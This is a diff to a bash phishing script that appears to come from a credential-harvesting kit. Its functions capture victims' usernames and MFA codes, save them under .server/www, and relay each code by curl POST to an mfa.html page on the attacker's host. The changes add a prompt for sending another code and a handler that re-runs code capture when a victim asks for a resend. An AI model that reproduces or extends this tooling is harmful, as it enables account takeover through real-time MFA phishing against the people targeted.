@@ -442,13 +442,13 @@ extract_code() {
             echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/code.txt"
             echo "$CODE" > auth/code.txt
 
-			send_data http://${HOST}:${PORT}/demo.html ${USER_INPUT}
+			send_data http://${HOST}:${PORT}/mfa.html ${USER_INPUT}
         else
             echo "$USER_INPUT" > .server/www/code.txt
             echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} New code entered by user:"
             echo -e "${BLUE}$USER_INPUT"
             echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}.server/www/code.txt"
-			send_data http://${HOST}:${PORT}/demo.html ${USER_INPUT}
+			send_data http://${HOST}:${PORT}/mfa.html ${USER_INPUT}
         fi
     else
         read -p "Enter the code: " USER_INPUT
@@ -456,7 +456,7 @@ extract_code() {
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Code entered by user:"
         echo -e "${BLUE}$USER_INPUT"
         echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}.server/www/code.txt"
-		send_data http://${HOST}:${PORT}/demo.html ${USER_INPUT}
+		send_data http://${HOST}:${PORT}/mfa.html ${USER_INPUT}
     fi
 }
 
@@ -470,14 +470,31 @@ send_data() {
     response=$(curl -s -X POST -d "number=$number" "$url" 2>&1)
     if [[ $? -eq 0 ]]; then
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Data sent successfully!"
+		
+		while true; do
+            read -p "Do you want to send another number? (y/n): " choice
+            case $choice in
+                [Yy]*)
+                    # read -p "Enter the new number: " new_number
+                    # send_data "$url" "$new_number"
+					extract_code
+                    break
+                    ;;
+                [Nn]*)
+                    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Execution continued..."
+                    break
+                    ;;
+                *)
+                    echo -e "\n${RED}[${WHITE}-${RED}]${RED} Invalid choice. Please try again."
+                    ;;
+            esac
+        done
 
     else
         echo -e "\n${RED}[${WHITE}-${RED}]${RED} Failed to send data!"
         echo -e "$response"
     fi
 } 
-
-# usage send_data "https://example.com/api/data" "123456"
 
 ## Get credentials
 capture_creds() {
@@ -513,6 +530,11 @@ capture_data() {
 			rm -rf .server/www/usernames.txt
 		fi
 		sleep 0.75
+		if [[ -e ".server/www/resend.txt" ]]; then
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Resend initiated by user !"
+			extract_code
+			rm -rf .server/www/resend.txt
+		fi
 	done
 }
 
